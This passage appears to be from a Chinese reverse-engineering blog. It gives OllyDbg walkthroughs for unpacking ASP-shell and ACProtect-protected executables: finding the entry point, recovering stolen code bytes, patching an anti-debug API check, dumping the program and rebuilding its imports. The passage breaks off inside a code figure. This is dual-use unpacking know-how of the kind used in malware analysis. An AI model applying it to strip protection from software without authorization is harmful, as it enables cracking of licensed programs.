id=\"脱asp变形壳01汉化版\"><a class=\"markdownIt-Anchor\" href=\"#脱asp变形壳01汉化版\">#</a> 脱 ASP 变形壳 0.1 汉化版</h3>\n<p>跟进第一个 jmp</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823202332415.png\" alt=\"image-20230823202332415\"></p>\n<p>单步之后进入循环，统计多少次跳转之后会执行。注意下段</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823202357774.png\" alt=\"image-20230823202357774\"></p>\n<p>58 次之后程序运行，指定到第 57 次</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823202408619.png\" alt=\"image-20230823202408619\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823202420672.png\" alt=\"image-20230823202420672\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823202429950.png\" alt=\"image-20230823202429950\"></p>\n<p>OEP</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823202448642.png\" alt=\"image-20230823202448642\"></p>\n<h2 id=\"脚本脱壳\"><a class=\"markdownIt-Anchor\" href=\"#脚本脱壳\">#</a> 脚本脱壳</h2>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823202505697.png\" alt=\"image-20230823202505697\"></p>\n<h2 id=\"acprotect\"><a class=\"markdownIt-Anchor\" href=\"#acprotect\">#</a> ACProtect</h2>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823202517781.png\" alt=\"image-20230823202517781\"></p>\n<p>1。设置异常，隐藏 OD</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823202532446.png\" alt=\"image-20230823202532446\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823202543177.png\" alt=\"image-20230823202543177\"></p>\n<p>shift + f9 到程序运行前的最后一次异常， 即 int</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823202558623.png\" alt=\"image-20230823202558623\"></p>\n<p>2。SE 处下内存访问断点</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823202610173.png\" alt=\"image-20230823202610173\"></p>\n<p>3。SHIFT+F9，F2，再一次 SHIFT+F9，下断，再一次 SHIFT+F9。运行到下面</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823202621786.png\" alt=\"image-20230823202621786\"></p>\n<p>4，取消所有断点</p>\n<p>总共删除三个断点，两个 F2 一个内存访问</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823202633995.png\" alt=\"image-20230823202633995\"></p>\n<p>5，内存，00401000。F2，SHIFT+F9</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823202651096.png\" alt=\"image-20230823202651096\"></p>\n<p>6，直达 OEP！！</p>\n<p>7。修复，脱壳成功</p>\n<h2 id=\"acprotect-stolen\"><a class=\"markdownIt-Anchor\" href=\"#acprotect-stolen\">#</a> ACProtect （stolen）</h2>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823202701371.png\" alt=\"image-20230823202701371\"></p>\n<p>和正常的 acprotect 一样，但是在第四步到 retn 之后需要找被偷的代码</p>\n<p>编辑条件，c++ 入口特征为 push ebp</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823202716512.png\" alt=\"image-20230823202716512\"></p>\n<p>ctrl + f11 跟踪进入 ，到被偷的代码，一共被偷了 6 个字节</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823202729791.png\" alt=\"image-20230823202729791\"></p>\n<p>004254C9    55              push ebp</p>\n<p>004254CA    8BEC            mov ebp,esp</p>\n<p>004254CC    83EC 44         sub esp,44</p>\n<p>重新到 oep，修复</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823202743559.png\" alt=\"image-20230823202743559\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823202757044.png\" alt=\"image-20230823202757044\"></p>\n<p>指定 10cc 为新的 eip</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823202812165.png\" alt=\"image-20230823202812165\"></p>\n<p>脱壳，不要选择重建输入表</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823202824896.png\" alt=\"image-20230823202824896\"></p>\n<p>修复：使用源程序修复，不要使用脱壳后的修复</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823202838534.png\" alt=\"image-20230823202838534\"></p>\n<p>修复完修正转存即可</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823202854598.png\" alt=\"image-20230823202854598\"></p>\n<h2 id=\"寻找修饰的stolen-code\"><a class=\"markdownIt-Anchor\" href=\"#寻找修饰的stolen-code\">#</a> 寻找修饰的 stolen code</h2>\n<p>1。设置异常（忽略除 INT3 中断的所有异常），隐藏 OD</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823202905273.png\" alt=\"image-20230823202905273\"></p>\n<p>2。来到入口点，F9 运行</p>\n<p>004AC000 &gt;  60              pushad   // 记住这个</p>\n<p>004AC001    4E              dec esi</p>\n<p>004AC002    D3D6            rcl esi,cl</p>\n<p>004AC004    4E              dec esi</p>\n<p>004AC005    66:D3E8         shr ax,cl</p>\n<p>004AC008    4E              dec esi</p>\n<p>004AC009    8BC3            mov eax,ebx</p>\n<p>004AC00B    48              dec eax</p>\n<p>3。程序中断在这里</p>\n<p>004BAB23    90              nop   // 这其实也是最后一次异常</p>\n<p>004BAB24    64:67:8F06 0000 pop dword ptr fs:[0]</p>\n<p>004BAB2A    83C4 04         add esp,4</p>\n<p>004BAB2D    60              pushad</p>\n<p>004BAB2E    E8 00000000     call NetClean.004BAB33</p>\n<p>004BAB33    5E              pop esi</p>\n<p>004BAB34    83EE 06         sub esi,6</p>\n<p>004BAB37    B9 5B000000     mov ecx,5B</p>\n<p>004BAB3C    29CE            sub esi,ecx</p>\n<p>004BAB3E    BA 09E5B87E     mov edx,7EB8E509</p>\n<p>004BAB43    C1E9 02         shr ecx,2</p>\n<p>004BAB46    83E9 02         sub ecx,2</p>\n<p>004BAB49    83F9 00         cmp ecx,0</p>\n<p>004BAB4C    7C 1A           jl short NetClean.004BAB68</p>\n<p>004BAB4E    8B048E          mov eax,dword ptr ds:[esi+ecx*4]</p>\n<p>4。看堆栈，找 SE 句柄，数据窗口跟随，下硬件访问断点，shift+F9</p>\n<p>5. 下断，再次 SHIFT+F9，下断，再次 SHIFT+F9，取消所有断点，直接 F4 到 RETN 处</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823202918479.png\" alt=\"image-20230823202918479\"></p>\n<p>6。下 d 12ffc0，下硬件断点。SHIFT+F9。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823202932026.png\" alt=\"image-20230823202932026\"></p>\n<p>7。记下 Stolen Code 。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823203013137.png\" alt=\"image-20230823203013137\"></p>\n<p>004C9B31    55              push ebp</p>\n<p>004C9B32    8BEC            mov ebp,esp</p>\n<p>004C9B34    6A FF           push -1</p>\n<p>8。找到内存，在 00401000 处下断，F2，SHIFT+F9。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823203022284.png\" alt=\"image-20230823203022284\"></p>\n<p>004431F9    68 D8B24400     push NetClean.0044B2D8                 // 这里其实是假的 OEP！！</p>\n<p>004431FE    68 B4334400     push NetClean.004433B4                    ; jmp 到</p>\n<p>00443203    64:A1 00000000  mov eax,dword ptr fs:[0]</p>\n<p>00443209    50              push eax</p>\n<p>0044320A    64:8925 0000000&gt;mov dword ptr fs:[0],esp</p>\n<p>00443211    83EC 68         sub esp,68</p>\n<p>00443214    53              push ebx</p>\n<p>9。写入真实的代码！！</p>\n<p>注意先分析，在按字节滚动，不然代码会乱</p>\n<p>ctrl + 方向键</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823203035385.png\" alt=\"image-20230823203035385\"></p>\n<p>10。OD 插件脱壳，注意，修正 OEP 地址！！</p>\n<p>11。IR 修复，用等级 3。不能修复的 CUT 掉。抓取修复。程序还是抱错！</p>\n<p>12。用 OD 打开 11 步修复过得程序，做下处理。来到壳的入口。也就是第一步记下的地址</p>\n<p>CTRL+G，004AC000</p>\n<p>13，写入真的 OEP 代码。保存</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823203053278.png\" alt=\"image-20230823203053278\"></p>\n<p>14。Lord PE 修正入口点</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823203103610.png\" alt=\"image-20230823203103610\"></p>\n<p>15。保存，脱壳成功！</p>\n<h2 id=\"acprotect-2x\"><a class=\"markdownIt-Anchor\" href=\"#acprotect-2x\">#</a> ACProtect 2.x</h2>\n<p>VB 程序：</p>\n<p>先根据 ACP 上面的方法找到 oep</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823203115600.png\" alt=\"image-20230823203115600\"></p>\n<p>修复：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823203133544.png\" alt=\"image-20230823203133544\"></p>\n<p>VB 第一个 push 是堆栈中第二行的值</p>\n<p>第二个 call 是最后一个 jmp 的值</p>\n<p>程序二：</p>\n<p>1. 下断：bp GetCurrentProcessId，F9</p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2023/png/2759285/1692130047921-73cddd0d-1b5b-4e0a-ad4c-32593ad10999.png\" alt=\"img\"></p>\n<p>2。</p>\n<p>7C809940 &gt;  64:A1 18000000  mov eax,dword ptr fs:[18]  // 断在这，取消断点</p>\n<p>7C809946    8B40 20         mov eax,dword ptr ds:[eax+20]</p>\n<p>7C809949    C3              retn</p>\n<p>3。用 Lord PE 查 OD 的 PID。</p>\n<p>4。把 2 中的代码改为</p>\n<p>7C809940 &gt;  B8 3C150000     mov eax,153C （当然，PID 号每次都会变）</p>\n<p>7C809945    90              nop</p>\n<p>7C809946    90              nop</p>\n<p>7C809947    90              nop</p>\n<p>7C809948    90              nop</p>\n<p>7C809949    C3              retn</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823203215898.png\" alt=\"image-20230823203215898\"></p>\n<p>5。下断，BP GetModuleHandleA，F9</p>\n<p>6。</p>\n<p>7C80B6C1 &gt;  8BFF            mov edi,edi   // 断在这</p>\n<p>7C80B6C3    55              push ebp</p>\n<p>7C80B6C4    8BEC            mov ebp,esp</p>\n<p>7C80B6C6    837D 08 00      cmp dword ptr ss:[ebp+8],0</p>\n<p>7C80B6CA    74 18           je short kernel32.7C80B6E4</p>\n<p>7C80B6CC    FF75 08         push dword ptr ss:[ebp+8]</p>\n<p>7C80B6CF    E8 C0290000     call kernel32.7C80E094</p>\n<p>7C80B6D4    85C0            test eax,eax</p>\n<p>7C80B6D6    74 08           je short kernel32.7C80B6E0</p>\n<p>7C80B6D8    FF70 04         push dword ptr ds:[eax+4]</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823203229480.png\" alt=\"image-20230823203229480\"></p>\n<p>7。来到内存，在 CODE 断下内存访问断点，F9 运行，出现 NAG 窗口，点确定后，来到 OEP！！！</p>\n<p>00402150    55              push ebp  //OEP！！</p>\n<p>00402151    8BEC            mov ebp,esp</p>\n<p>00402153    83C4 F0         add esp,-10</p>\n<p>00402156    53              push ebx</p>\n<p>00402157    B8 10214000     mov eax,ACP_Feed.00402110</p>\n<p>0040215C    E8 4FFCFFFF     call ACP_Feed.00401DB0</p>\n<p>00402161    68 C4214000     push ACP_Feed.004021C4                    ; ASCII “ACProtect Feedback Form”</p>\n<p>00402166    6A 00           push 0</p>\n<p>00402168    6A 00           push 0</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823203240237.png\" alt=\"image-20230823203240237\"></p>\n<p>8。脱壳，修复。用等级 3！或者手动找 MessageBoxA</p>\n<p>9。抓取，脱壳成功！！</p>\n<h3 id=\"-5\"><a class=\"markdownIt-Anchor\" href=\"#-5\">#</a> </h3>\n<h2 id=\"特殊的acprotect\"><a class=\"markdownIt-Anchor\" href=\"#特殊的acprotect\">#</a> 特殊的 ACProtect</h2>\n<p>取消忽略 int3，程序断在这边</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823203249815.png\" alt=\"image-20230823203249815\"></p>\n<p>使用堆栈窗口中 se 大法</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823203259109.png\" alt=\"image-20230823203259109\"></p>\n<p>取消所有断点</p>\n<p>找到假的 oep</p>\n<p>重新载入，使用 esp 大法</p>\n<p>运行到程序执行前</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823203310181.png\" alt=\"image-20230823203310181\"></p>\n<p>脱壳</p>\n<p>修正，完整转存</p>\n<p>修复，oep 写假的 oep</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823203322391.png\" alt=\"image-20230823203322391\"></p>\n<p>修复 IAT 未果，剪切 iat，修复转存，转存之前把 oep 改到运行之前的地址</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823203332596.png\" alt=\"image-20230823203332596\"></p>\n<h2 id=\"anti-protect\"><a class=\"markdownIt-Anchor\" href=\"#anti-protect\">#</a> anti protect</h2>\n<p>补区段</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br><span class=\"line\">286</span><br><span class=\"line\">287</span><br><span class=\"line\">288</span><br><span class=\"line\">289</span><br><span class=\"line\">290</span><br><span class=\"line\">291</span><br><span class=\"line\">292</span><br><span class=\"line\">293</span><br><span class=\"line\">294</span><br><span class=\"line\">295</span><br><span class=\"line\">296</span><br><span class=\"line\">297</span><br><span class=\"line\">298</span><br><span class=\"line\">299</span><br><span class=\"line\">300</span><br><span class=\"line\">301</span><br><span class=\"line\">302</span><br><span class=\"line\">303</span><br><span class=\"line\">304</span><br><span class=\"line\">305</span><br><span class=\"line\">306</span><br><span class=\"line\">307</span><br><span class=\"line\">308</span><br><span class=\"line\">309</span><br><span class=\"line\">310</span><br><span class=\"line\">311</span><br><span class=\"line\">312</span><br><span class=\"line\">313</span><br><span class=\"line\">314</span><br><span class=\"line\">315</span><br><span class=\"line\">316</span><br><span class=\"line\">317</span><br><span class=\"line\">318</span><br><span class=\"line\">319</span><br><span class=\"line\">320</span><br><span class=\"line\">321</span><br><span class=\"line\">322</span><br><span class=\"line\">323</span><br><span class=\"line\">324</span><br><span class=\"line\">325</span><br><span class=\"line\">326</span><br><span class=\"line\">327</span><br><span class=\"line\">328</span><br><span class=\"line\">329</span><br><span class=\"line\">330</span><br><span class=\"line\">331</span><br><span class=\"line\">332</span><br><span class=\"line\">333</span><br><span class=\"line\">334</span><br><span class=\"line\">335</span><br><span class=\"line\">336</span><br><span class=\"line\">337</span><br><span class=\"line\">338</span><br><span class=\"line\">339</span><br><span class=\"line\">340</span><br><span class=\"line\">341</span><br><span class=\"line\">342</span><br><span class=\"line\">343</span><br><span class=\"line\">344</span><br><span class=\"line\">345</span><br><span class=\"line\">346</span><br><span class=\"line\">347</span><br><span class=\"line\">348</span><br><span class=\"line\">349</span><br><span class=\"line\">350</span><br><span class=\"line\">351</span><br><span class=\"line\">352</span><br><span class=\"line\">353</span><br><span class=\"line\">354</span><br><span class=\"line\">355</span><br><span class=\"line\">356</span><br><span class=\"line\">357</span><br><span class=\"line\">358</span><br><span class=\"line\">359</span><br><span class=\"line\">360</span><br><span class=\"line\">361</span><br><span class=\"line\">362</span><br><span class=\"line\">363</span><br><span class=\"line\">364</span><br><span class=\"line\">365</span><br><span class=\"line\">366</span><br><span class=\"line\">367</span><br><span class=\"line\">368</span><br><span class=\"line\">369</span><br><span class=\"line\">370</span><br><span class=\"line\">371</span><br><span class=\"line\">372</span><br><span class=\"line\">373</span><br><span class=\"line\">374</span><br><span class=\"line\">375</span><br><span class=\"line\">376</span><br><span class=\"line\">377</span><br><span class=\"line\">378</span><br><span class=\"line\">379</span><br><span class=\"line\">380</span><br><span class=\"line\">381</span><br><span class=\"line\">382</span><br><span class=\"line\">383</span><br><span class=\"line\">384</span><br><span class=\"line\">385</span><br><span class=\"line\">386</span><br><span class=\"line\">387</span><br><span class=\"line\">388</span><br><span class=\"line\">389</span><br><span class=\"line\">390</span><br><span class=\"line\">391</span><br><span class=\"line\">392</span><br><span class=\"line\">393</span><br><span class=\"line\">394</span><br><span class=\"line\">395</span><br><span class=\"line\">396</span><br><span class=\"line\">397</span><br><span class=\"line\">398</span><br><span class=\"line\">399</span><br><span class=\"line\">400</span><br><span class=\"line\">401</span><br><span class=\"line\">402</span><br><span class=\"line\">403</span><br><span class=\"line\">404</span><br><span class=\"line\">405</span><br><span class=\"line\">406</span><br><span class=\"line\">407</span><br><span class=\"line\">408</span><br><span class=\"line\">409</span><br><span class=\"line\">410</span><br><span class=\"line\">411</span><br><span class=\"line\">412</span><br><span class=\"line\">413</span><br><span class=\"line\">414</span><br><span class=\"line\">415</span><br><span class=\"line\">416</span><br><span class=\"line\">417</span><br><span class=\"line\">418</span><br><span class=\"line\">419</span><br><span class=\"line\">420</span><br><span class=\"line\">421</span><br><span class=\"line\">422</span><br><span class=\"line\">423</span><br><span class=\"line\">424</span><br><span class=\"line\">425</span><br><span class=\"line\">426</span><br><span class=\"line\">427</span><br><span class=\"line\">428</span><br><span class=\"line\">429</span><br><span class=\"line\">430</span><br><span class=\"line\">431</span><br><span class=\"line\">432</span><br><span class=\"line\">433</span><br><span class=\"line\">434</span><br><span class=\"line\">435</span><br><span class=\"line\">436</span><br><span class=\"line\">437</span><br><span class=\"line\">438</span><br><span class=\"line\">439</span><br><span class=\"line\">440</span><br><span class=\"line\">441</span><br><span class=\"line\">442</span><br><span class=\"line\">443</span><br><span class=\"line\">444</span><br><span class=\"line\">445</span><br><span class=\"line\">446</span><br><span class=\"line\">447</span><br><span class=\"line\">448</span><br><span class=\"line\">449</span><br><span class=\"line\">450</span><br><span class=\"line\">451</span><br><span class=\"line\">452</span><br><span class=\"line\">453</span><br><span class=\"line\">454</span><br><span class=\"line\">455</span><br><span class=\"line\">456</span><br><span class=\"line\">457</span><br><span class=\"line\">458</span><br><span class=\"line\">459</span><br><span class=\"line\">460</span><br><span class=\"line\">461</span><br><span class=\"line\">462</span><br><span class=\"line\">463</span><br><span class=\"line\">464</span><br><span class=\"line\">465</span><br><span class=\"line\">466</span><br><span class=\"line\">467</span><br><span class=\"line\">468</span><br><span class=\"line\">469</span><br><span class=\"line\">470</span><br><span class=\"line\">471</span><br><span class=\"line\">472</span><br><span class=\"line\">473</span><br><span class=\"line\">474</span><br><span class=\"line\">475</span><br><span class=\"line\">476</span><br><span class=\"line\">477</span><br><span class=\"line\">478</span><br><span class=\"line\">479</span><br><span class=\"line\">480</span><br><span class=\"line\">481</span><br><span class=\"line\">482</span><br><span class=\"line\">483</span><br><span class=\"line\">484</span><br><span class=\"line\">485</span><br><span class=\"line\">486</span><br><span class=\"line\">487</span><br><span class=\"line\">488</span><br><span class=\"line\">489</span><br><span class=\"line\">490</span><br><span class=\"line\">491</span><br><span class=\"line\">492</span><br><span class=\"line\">493</span><br><span class=\"line\">494</span><br><span class=\"line\">495</span><br><span class=\"line\">496</span><br><span class=\"line\">497</span><br><span class=\"line\">498</span><br><span class=\"line\">499</span><br><span class=\"line\">500</span><br><span class=\"line\">501</span><br><span class=\"line\">502</span><br><span class=\"line\">503</span><br><span class=\"line\">504</span><br><span class=\"line\">505</span><br><span class=\"line\">506</span><br><span class=\"line\">507</span><br><span class=\"line\">508</span><br><span class=\"line\">509</span><br><span class=\"line\">510</span><br><span class=\"line\">511</span><br><span class=\"line\">512</span><br><span class=\"line\">513</span><br><span class=\"line\">514</span><br><span class=\"line\">515</span><br><span class=\"line\">516</span><br><span class=\"line\">517</span><br><span class=\"line\">518</span><br><span class=\"line\">519</span><br><span class=\"line\">520</span><br><span class=\"line\">521</span><br><span class=\"line\">522</span><br><span class=\"line\">523</span><br><span class=\"line\">524</span><br><span class=\"line\">525</span><br><span class=\"line\">526</span><br><span class=\"line\">527</span><br><span class=\"line\">528</span><br><span class=\"line\">529</span><br><span class=\"line\">530</span><br><span class=\"line\">531</span><br><span class=\"line\">532</span><br><span class=\"line\">533</span><br><span class=\"line\">534</span><br><span class=\"line\">535</span><br><span class=\"line\">536</span><br><span class=\"line\">537</span><br><span class=\"line\">538</span><br><span class=\"line\">539</span><br><span class=\"line\">540</span><br><span 